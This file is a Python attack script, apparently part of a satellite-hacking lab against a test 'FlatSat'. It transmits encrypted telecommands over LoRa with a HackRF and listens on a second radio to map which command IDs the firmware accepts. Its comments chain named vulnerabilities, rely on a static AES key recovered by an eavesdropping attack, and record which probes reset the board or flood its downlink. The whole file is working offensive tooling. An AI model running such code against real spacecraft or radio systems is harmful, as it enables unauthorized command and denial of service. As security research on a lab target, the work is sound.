#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 00_recon_apid_enum_rf.py -- black-box APID enumeration over radio.
#
# Root cause / vulnerability class: finding #4 (no
# rate-limiting on uplink reception -- enables mass APID fuzzing with no
# penalty) combined with finding #21 (recon APIDs respond without
# authentication) and finding #22 (no TC/TM type check). Together: an
# attacker who has just the AES key (recovered via attack 01,
# eavesdropping -- the key is static, so observing any encrypted exchange
# is enough) can systematically probe every possible APID value and learn
# which ones exist, purely from the FlatSat's own responses, with zero
# prior knowledge of this firmware's command set.
#
# This is what a genuinely black-box attacker would need to do BEFORE
# something like attack 03 (command injection) or 02 (fuzzing crash) --
# neither of those scripts would be buildable without first knowing APID
# 0x04 is SET_THRUSTER or that APID 0x06 exists at all. This tool is that
# missing precursor step.
#
# How it works: for each candidate APID, build a small encrypted
# telecommand (garbage payload, the known AES key -- there's no MAC/
# integrity check, see attack 01, so garbage content still "decrypts
# successfully" into something the firmware will try to process) and
# transmit it via HackRF, while a second, dedicated radio (a CatSniffer
# v2, see pwnsat_catsniffer_rx.py) listens continuously on the downlink
# for a response -- see the TWO-RADIO SETUP note below for why this needs
# a second device, not just the same HackRF switched to RX. The firmware
# ALWAYS replies to a structurally valid packet, even for unknown APIDs:
# commandApidHandler's final else branch prints "[ERROR] Unknown APID"
# and transmits an ERROR TM (APID 0x009) back. That means every sweep
# step gets a classification, not just the "hits":
#   - a decodable TM whose APID is NOT 0x009 -> a real, implemented command
#   - a decodable TM with APID 0x009 (ERROR) -> valid APID *range*, but
#     this specific value isn't implemented
#   - nothing decoded in the listen window -> lost to RF noise (retry),
#     or the FlatSat stopped responding entirely (see safety note)
#
# SAFETY NOTE: this sweep does not know in advance which APIDs are
# "dangerous" -- that's the whole point of black-box recon. APID 0x02
# (RESETC) resets the board on ANY payload content, and APID 0x06
# (BROADCAST_MSG) with a too-short payload is the finding #10 crash
# (attack 02) -- both are in the default sweep range and WILL trigger if
# hit, exactly as a real attacker would stumble onto them "by accident"
# during recon. This tool's probe payload's byte LENGTH (4) is long
# enough that BROADCAST_MSG specifically will NOT hit the underflow (that
# needs exactly a 0-byte payload) -- but RESETC doesn't care about
# payload content at all and will always fire. Use --skip to exclude
# specific APIDs (e.g. --skip 2 to avoid an unplanned reset) or
# --start/--end to narrow the range.
#
# A SECOND danger found the hard way (2026-07-17): APID 0x005
# (SET_BEACON_RATE) reads payload byte[0] as a beacon interval in
# SECONDS with no minimum -- worker.cpp sets `t_radio_beacon.interval =
# b_seconds * 1000` directly. An all-zero probe payload (the original
# default here) sets that interval to 0ms, and the main loop's own
# `millis() - previous > interval` check is then true on effectively
# every iteration -- the FlatSat floods its own downlink with beacon TMs
# nonstop (this is finding #18, "beacon-flood", already in C3's own
# documented attack list) and needs a physical power-cycle to recover.
# Hit this twice in this session before finding the cause -- it looked
# exactly like an unrelated USB/power glitch (flooding console, FlatSat
# unresponsive) until the actual [TC - SPP] APID=0x005 line was spotted
# in the debug log. PROBE_PAYLOAD is now non-zero specifically so
# byte[0] is never 0 for whichever APID it lands on.
#
# TWO-RADIO SETUP -- WHY THIS TOOL NEEDS A CATSNIFFER, NOT JUST A HACKRF
# ------------------------------------------------------------------------
# First built this with a single HackRF switched between TX and RX per
# probe (transmit, then hackrf_transfer -r immediately after). Confirmed
# empirically (2026-07-17) that this DOES NOT WORK reliably: the FlatSat
# replies in ~11ms of receiving a command (measured on the debug console:
# "[TC - SPP] ..." and "[TM - SPP] ..." land 11ms apart), but closing out
# `hackrf_transfer -t` and opening a fresh `hackrf_transfer -r` (USB
# device reopen + re-tune) costs well over 100ms every time -- confirmed
# with 4 straight retries, 0 catches. That's a deterministic hardware gap,
# not RF noise, so retries alone can't fix it (retries only help against
# genuine packet loss/collisions, which is why --retries still exists
# below, just no longer doing the heavy lifting).
#
# The fix: a second, dedicated radio for RX, so nothing ever has to
# switch modes. This session had a CatSniffer v2 (Electronic Cats,
# SX1262-based) on hand, already flashed with its own "LoRa Sniffer CLI"
# firmware -- pwnsat_catsniffer_rx.py drives it over serial, tuned to
# match New-firmware/rdownlink.h's downlink config exactly, and leaves it
# in continuous RX for the whole sweep. HackRF stays TX-only throughout.
# Confirmed working: probing an unimplemented APID (guaranteed to only
# ever get an ERROR TM, never a periodic beacon, so an unambiguous test)
# caught the real reply 39ms after TX, clean signal (SNR ~12dB) -- this
# confirmed the dual-radio setup after a single-HackRF attempt fell short.
#
# You WILL also see occasional weak/garbled frames matching your OWN
# probe's sequence number, very low SNR (single digits negative or
# below) -- that's this uplink TX leaking into the CatSniffer's receiver
# (918MHz probe, 916MHz listen, only 2MHz apart) with a weak/wrong
# antenna, not a real downlink packet. --min-snr filters these out (and
# the packet_type check in _probe_apid_once() catches it unconditionally
# regardless of SNR -- see that function's own comment).
#
# RTL-SDR FALLBACK: both CatSniffers on hand this session turned out to
# be hardware-faulty (stopped enumerating on USB entirely across
# multiple cable/port/antenna swaps -- not fixable from this side).
# `--rx-device rtlsdr` (the default) uses pwnsat_rtlsdr_rx.py instead,
# which borrows PWNSAT-C3's own RTL-SDR (see project_defcon_demo_hardware
# memory) via the same live GNU Radio flowgraph the C3 bridge and
# 01_eavesdropping already use -- same "second dedicated radio, continuous
# RX" principle, just a different physical device. C3 and this script
# can't share the RTL-SDR, so stop C3 (and its own RTL-SDR bridge
# process) before running this. No RSSI/SNR reporting on this path (the
# CatSniffer's own CLI provides that, the RTL-SDR flowgraph doesn't) --
# the packet_type check alone still catches self-leakage reliably.
#
# Needs a Python with gnuradio importable (still true -- HackRF TX still
# renders LoRa baseband the same way as every other attack here) and
# either a CatSniffer v2 or PWNSAT-C3's RTL-SDR free. This script will
# say so with concrete next steps if either is missing, see
# require_gnuradio.py / PWNSAT-C3's INSTALL.md (github.com/Pwnsat/PWNSAT-C3):
#   ./00_recon_apid_enum.py
#   ./00_recon_apid_enum.py --start 0 --end 0x14
#   ./00_recon_apid_enum.py --skip 2 6   # skip RESETC and BROADCAST_MSG

import argparse
import sys
import time
from pathlib import Path

# Piping through `tee`/a file (not a live terminal) makes Python fully
# buffer stdout instead of line-buffering it -- confirmed by hand
# (2026-07-17) that this script's own progress prints ("[*] Probing
# APID...", "-> REAL RESPONSE...") can sit buffered behind a subprocess's
# much noisier raw output (hackrf_transfer, GNU Radio's own print_rx
# debug spew) for a long time, so a `| tee sweep.log` run shows none of
# this script's own real-time signal -- including, critically, an early
# warning of which APID is about to be probed right before something
# dangerous happens (see the SAFETY NOTE above re: SET_BEACON_RATE).
sys.stdout.reconfigure(line_buffering=True)

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from pwnsat_packets import APIDS, build_tc, decode_packet, encrypt_payload  # noqa: E402

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()  # exits with a clear message here if this Python can't import gnuradio

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402
from pwnsat_catsniffer_rx import CatSnifferRX  # noqa: E402
from pwnsat_rtlsdr_rx import RtlSdrRX  # noqa: E402

ERROR_TM_APID = 0x009

# Payload used for every probe: 4 bytes, all 0x01. Long enough that
# BROADCAST_MSG (0x06) does NOT hit the finding #10 underflow (that needs
# specifically a 0-byte declared payload -- deliberately triggering that
# is attack 02, not this tool). Not a "valid" payload for most commands
# (e.g. SET_THRUSTER wants exactly 2 meaningful bytes) -- that's fine,
# garbage content is fine here, this only cares whether the APID is
# recognized at all, not whether the specific command succeeds cleanly.
#
# Specifically NOT all-zero (the original version of this constant) --
# see the SAFETY NOTE at the top of this file: byte[0]=0 landing on APID
# 0x005 (SET_BEACON_RATE) sets the beacon interval to 0ms and floods the
# downlink (finding #18), hit twice in this session before the cause was
# found. byte[0]=1 there is a harmless 1-second beacon rate instead.
PROBE_PAYLOAD = bytes([0x01, 0x01, 0x01, 0x01])


def _probe_apid_once(apid: int, *, seq: int, tx_gain: int, listen_s: float,
                     verbose: bool, cat, min_snr: float) -> list[dict]:
    payload = encrypt_payload(PROBE_PAYLOAD)
    raw_spp = build_tc(apid, payload, seq)

    t0 = time.time()
    transmit_packet(raw_spp, frequency=UPLINK_FREQ_HZ, device_args="hackrf",
                    tx_gain=tx_gain, verbose=verbose)
    time.sleep(listen_s)
    frames = cat.take_since(t0)
    if not frames:
        return []

    # This firmware always replies to a given TC's APID with the SAME
    # numeric APID on the TM side (confirmed throughout this whole
    # session -- PING TC 0x01 gets a PING TM 0x01, GS_STATUS TC 0x13 gets
    # a GS_STATUS TM 0x13, etc.) -- so that's the strongest signal a
    # decoded frame is actually THIS probe's response, not some unrelated
    # periodic beacon (SEND_TM/NAV/PING-sync/IDLE all transmit on their
    # own timers every 14-30s, see worker.cpp's telemetryRadioWorker) that
    # happened to land in the same listen window.
    results = []
    for frame in frames:
        # snr_db only exists on CatSnifferRX's frames (the CatSniffer's
        # own CLI reports it per packet) -- RtlSdrRX's ZMQ output has no
        # per-frame SNR, so this filter is a no-op for that backend
        # (min_snr stays a CLI flag either way, just inert on RTL-SDR).
        snr = getattr(frame, "snr_db", None)
        if snr is not None and snr < min_snr:
            # Almost always our own uplink TX leaking into the RX
            # receiver (918MHz probe vs 916MHz listen, only 2MHz apart)
            # -- see the TWO-RADIO SETUP note at the top of this file. A
            # genuine downlink reply measured ~12dB SNR; leakage
            # measured around -1dB. Not a real decoded packet.
            if verbose:
                print(f"    (ignoring weak/garbled frame, SNR={snr:.1f}dB "
                      f"-- likely our own TX leaking into the RX, not a real reply)")
            continue
        try:
            pkt = decode_packet(frame.raw)
        except ValueError as exc:
            print(f"    -> got {len(frame.raw)} bytes, couldn't parse as SPP: {exc}")
            continue

        if pkt.packet_type == 1:
            # A TC (telecommand), not a TM (telemetry) -- the FlatSat
            # never replies with a TC, so this can only be a garbled
            # decode of our OWN uplink probe leaking into the receiver.
            # Confirmed by hand (2026-07-17): APID-only matching isn't
            # enough to rule this out, because a leaked copy of our own
            # probe trivially has apid == probed_apid (we set it) --
            # one such leaked frame slipped past the SNR filter (0.2dB,
            # just above the 0.0 default) and got misreported as a REAL
            # RESPONSE. Checking packet_type catches it unconditionally,
            # regardless of how clean the leaked copy's SNR looks -- and
            # is the ONLY leakage filter available on the RtlSdrRX
            # backend, which has no SNR at all.
            if verbose:
                snr_txt = f"SNR={snr:.1f}dB" if snr is not None else "no SNR reported"
                print(f"    (ignoring TC-type frame, {snr_txt} -- our own probe "
                      f"leaking into the RX, the FlatSat never replies with a TC)")
            continue

        if pkt.apid == apid:
            tag, classification = "REAL RESPONSE (matches probed APID)", "real"
        elif pkt.apid == ERROR_TM_APID:
            tag, classification = "unknown (ERROR TM)", "error"
        else:
            tag, classification = "unrelated traffic (different APID -- background beacon, not this probe)", "unrelated"
        snr_txt = f" SNR={snr:.1f}dB" if snr is not None else ""
        print(f"    -> {tag}: APID 0x{pkt.apid:03X} ({pkt.apid_name}) seq={pkt.sequence_count}{snr_txt}")
        results.append({"probed_apid": apid, "response_apid": pkt.apid,
                        "response_name": pkt.apid_name, "classification": classification})
    return results


def probe_apid(apid: int, *, seq: int, tx_gain: int, listen_s: float,
               verbose: bool, retries: int, cat,
               min_snr: float) -> list[dict]:
    print(f"\n[*] Probing APID 0x{apid:03X} ({APIDS.get(apid, 'not in known list')})...")
    for attempt in range(1, retries + 1):
        if retries > 1:
            print(f"    [attempt {attempt}/{retries}]")
        results = _probe_apid_once(
            apid, seq=seq + attempt - 1, tx_gain=tx_gain, listen_s=listen_s,
            verbose=verbose, cat=cat, min_snr=min_snr,
        )
        if any(r["classification"] in ("real", "error") for r in results):
            return results
        if attempt < retries:
            print(f"    -> no matching response yet (attempt {attempt}/{retries}), "
                  f"retrying (RF noise/packet loss -- not the old TX/RX turnaround "
                  f"race, that's fixed by the CatSniffer now)...")
    print("    -> no response after all retries (RF noise, or the FlatSat "
          "stopped responding entirely; check PWNSAT-C3/serial if this keeps "
          "happening on every APID)")
    return []


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--start", type=lambda x: int(x, 0), default=0x00,
                        help="first APID to probe (default 0x00)")
    parser.add_argument("--end", type=lambda x: int(x, 0), default=0x14,
                        help="last APID to probe, inclusive (default 0x14 -- "
                             "covers every named APID in pwnsat_tools/spp_tools.py)")
    parser.add_argument("--skip", type=lambda x: int(x, 0), nargs="*", default=[],
                        metavar="APID",
                        help="APID(s) to exclude from the sweep, e.g. --skip 2 6 "
                             "to avoid triggering RESETC/the fuzzing crash")
    parser.add_argument("--listen-seconds", type=float, default=0.6,
                        help="how long to wait after each probe before checking "
                             "what the CatSniffer caught (default 0.6s -- replies "
                             "measured around 11-40ms, this is generous margin)")
    parser.add_argument("--retries", type=int, default=2,
                        help="attempts per APID before giving up (default 2) -- "
                             "now only covers genuine RF noise/packet loss, not "
                             "the old TX/RX turnaround race (fixed by the "
                             "CatSniffer, see TWO-RADIO SETUP note in this file's "
                             "header)")
    parser.add_argument("--min-snr", type=float, default=0.0,
                        help="minimum SNR (dB) for a captured frame to be treated "
                             "as a real reply rather than our own TX leaking into "
                             "the CatSniffer's receiver (default 0.0 -- genuine "
                             "replies measured ~12dB, leakage measured ~-1dB)")
    parser.add_argument("--tx-gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--rx-device", choices=("rtlsdr", "catsniffer"), default="rtlsdr",
                        help="which dedicated radio to use for RX (default rtlsdr -- "
                             "both CatSniffers on hand this session turned out to be "
                             "hardware-faulty, see TWO-RADIO SETUP note; pass "
                             "--rx-device catsniffer once one is confirmed working "
                             "again). rtlsdr borrows PWNSAT-C3's own RTL-SDR, so stop "
                             "C3 first if it's running (they can't share the device).")
    parser.add_argument("--catsniffer-port", default=None,
                        help="serial port for the CatSniffer (default: autodetect "
                             "by USB descriptor, see pwnsat_catsniffer_rx.py) -- "
                             "only used with --rx-device catsniffer")
    parser.add_argument("--rx-gain", type=int, default=30,
                        help="RTL-SDR tuner gain, dB -- only used with --rx-device rtlsdr")
    parser.add_argument("--seq", type=int, default=1, help="starting SPP sequence count")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output and the RX "
                             "device's own status messages")
    args = parser.parse_args()

    skip = set(args.skip)
    targets = [a for a in range(args.start, args.end + 1) if a not in skip]

    print("=" * 66)
    print(f"PWNSAT APID enumeration -- probing {len(targets)} APID(s) "
          f"(0x{args.start:02X}-0x{args.end:02X}), skip={sorted(skip)}")
    print("Black-box recon: findings #4 (no rate-limit) + #21")
    print("(unauthenticated recon) + #22 (no TC/TM check) combined.")
    print(f"TX: HackRF (918MHz uplink).  RX: {args.rx_device} (916MHz downlink, "
          "continuous) -- see TWO-RADIO SETUP note in this file's header.")
    print("=" * 66)

    if args.rx_device == "catsniffer":
        cat = CatSnifferRX(port=args.catsniffer_port, verbose=not args.quiet)
    else:
        cat = RtlSdrRX(rf_gain=args.rx_gain, verbose=not args.quiet)
    cat.start()
    time.sleep(0.5)  # let the RX settle before the first probe

    all_results: list[dict] = []
    try:
        for i, apid in enumerate(targets):
            # Each APID reserves `retries` sequence numbers so retries never
            # collide with the next APID's probe.
            all_results.extend(probe_apid(
                apid, seq=args.seq + i * args.retries, tx_gain=args.tx_gain,
                listen_s=args.listen_seconds, verbose=not args.quiet,
                retries=args.retries, cat=cat, min_snr=args.min_snr,
            ))
    finally:
        cat.close()

    real = {r["probed_apid"]: r["response_name"] for r in all_results
            if r["classification"] == "real"}
    errored = {r["probed_apid"] for r in all_results if r["classification"] == "error"} - set(real)
    silent = set(targets) - set(real) - errored

    print("\n" + "=" * 66)
    print("SUMMARY")
    print("=" * 66)
    if real:
        print("Real, implemented commands found (probed APID -> its own name):")
        for apid, name in sorted(real.items()):
            print(f"  0x{apid:03X}  {name}")
    if errored:
        print("Valid APID range, but not implemented (got ERROR TM back):")
        print("  " + ", ".join(f"0x{a:03X}" for a in sorted(errored)))
    if silent:
        print("No matching response (RF noise -- retry -- or worth a closer look "
              "by hand; may have only caught unrelated background telemetry):")
        print("  " + ", ".join(f"0x{a:03X}" for a in sorted(silent)))
    print(f"\n[*] Sweep complete -- {len(real)} real command(s) out of {len(targets)} probed.")


if __name__ == "__main__":
    main()
